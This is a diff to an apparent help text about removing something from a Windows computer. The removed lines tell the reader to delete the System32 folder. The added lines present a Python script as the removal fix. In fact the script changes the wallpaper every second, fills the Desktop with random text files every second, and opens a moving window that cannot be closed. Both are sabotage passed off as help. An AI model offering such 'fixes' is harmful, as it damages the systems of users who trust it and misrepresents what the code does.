@@ -1,4 +1,101 @@
-HOW TO REMOVE IT?
+YOU WANT TO REMOVE IT THEN INSTALL PYTHON 3.12 AND RUN THIS CODE  
 
-EZ ONLY GO "explorer.exe" GO C:/system
-THEN Windows AND SEARCH "System32" And DELETE THE FOLDER AFTER THIS RESTART COMPUTER AND IT WORK FINE
+
+
+import tkinter as tk
+import ctypes
+import os
+import random
+from PIL import Image
+import string
+
+# Funktion, um ein einfarbiges Bild zu erstellen
+def create_solid_color_image(color, size=(1920, 1080)):
+    image = Image.new("RGB", size, color)
+    image_path = os.path.join(os.getcwd(), "solid_color.jpg")
+    image.save(image_path)
+    return image_path
+
+# Funktion, um den Desktop-Hintergrund zu ändern (nur Windows)
+def set_wallpaper(image_path):
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, image_path, 3)
+
+# Funktion, um eine zufällige Farbe zu erzeugen
+def random_color():
+    return "#{:02x}{:02x}{:02x}".format(random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
+
+# Funktion, um den Hintergrund alle Sekunden zu wechseln
+def change_background():
+    color = random_color()
+    image_path = create_solid_color_image(color)
+    set_wallpaper(image_path)
+    root.after(1000, change_background)
+
+# Funktion, um zufälligen Text zu generieren
+def random_text(length=100):
+    letters = string.ascii_letters + string.digits + string.punctuation
+    return ''.join(random.choice(letters) for i in range(length))
+
+# Funktion, um eine zufällige Textdatei auf dem Desktop zu erstellen
+def create_random_text_file():
+    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
+    file_name = f"random_file_{random.randint(1, 100000)}.txt"
+    file_path = os.path.join(desktop_path, file_name)
+    with open(file_path, 'w') as file:
+        file.write(random_text())
+    root.after(1000, create_random_text_file)
+
+# Erstelle das Hauptfenster
+root = tk.Tk()
+
+# Setze den Titel des Fensters
+root.title("Bewegendes Fenster")
+
+# Setze die Größe des Fensters
+root.geometry("400x300")
+
+# Füge ein Label mit Text hinzu
+label = tk.Label(root, text="Dies ist ein sich bewegendes Fenster!", font=("Helvetica", 16))
+label.pack(pady=20)
+
+# Initiale Position
+x, y = 0, 0
+# Bewegungsrichtung
+dx, dy = 1, 1
+
+def move_window():
+    global x, y, dx, dy
+    # Aktualisiere die Position
+    x += dx
+    y += dy
+
+    # Prüfe die Bildschirmränder und ändere die Richtung, falls nötig
+    if x <= 0 or x + 400 >= root.winfo_screenwidth():
+        dx = -dx
+    if y <= 0 or y + 300 >= root.winfo_screenheight():
+        dy = -dy
+
+    # Setze die neue Position des Fensters
+    root.geometry(f"400x300+{x}+{y}")
+
+    # Wiederhole diese Funktion nach 10 Millisekunden
+    root.after(10, move_window)
+
+# Funktion, die das Schließen des Fensters verhindert
+def disable_close():
+    pass
+
+# Überschreibe die Standardaktion beim Schließen des Fensters
+root.protocol("WM_DELETE_WINDOW", disable_close)
+
+# Starte die Bewegung
+move_window()
+
+# Starte das Wechseln des Hintergrunds
+change_background()
+
+# Starte das Erstellen von zufälligen Textdateien
+create_random_text_file()
+
+# Starte die Hauptereignisschleife
+root.mainloop()
